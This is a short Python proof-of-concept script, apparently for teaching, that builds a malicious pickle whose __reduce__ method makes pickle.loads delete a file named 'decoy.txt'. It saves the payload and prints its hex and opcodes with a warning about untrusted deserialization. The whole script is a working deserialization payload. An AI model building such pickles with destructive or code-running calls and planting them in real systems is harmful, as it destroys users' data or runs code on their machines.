import pickle
import os

class MaliciousPayload:
    """
    A class that returns a malicious payload via __reduce__.
    When unpickled, this will execute os.remove('decoy.txt')
    """
    def __reduce__(self):
        # Return tuple: (callable, arguments_tuple)
        # This tells pickle to call os.remove('decoy.txt') during deserialization
        return (os.remove, ('decoy.txt',))

# Create an instance of the malicious class
payload_instance = MaliciousPayload()

# Serialize the instance using pickle.dumps()
malicious_payload = pickle.dumps(payload_instance)

# Save the payload to 'malicious.pickle'
with open('malicious.pickle', 'wb') as f:
    f.write(malicious_payload)

print("[+] Malicious pickle payload created successfully!")
print(f"[+] Payload saved to: malicious.pickle")
print(f"[+] Payload size: {len(malicious_payload)} bytes")
print(f"\n[+] Hex representation:")
print(malicious_payload.hex())

print(f"\n[+] Human-readable opcodes:")
import pickletools
pickletools.dis(malicious_payload)

print(f"\n[!] WARNING: When this pickle is deserialized with pickle.loads(), it will execute os.remove('decoy.txt')")
print(f"[!] This demonstrates why deserializing untrusted pickle data is dangerous!")

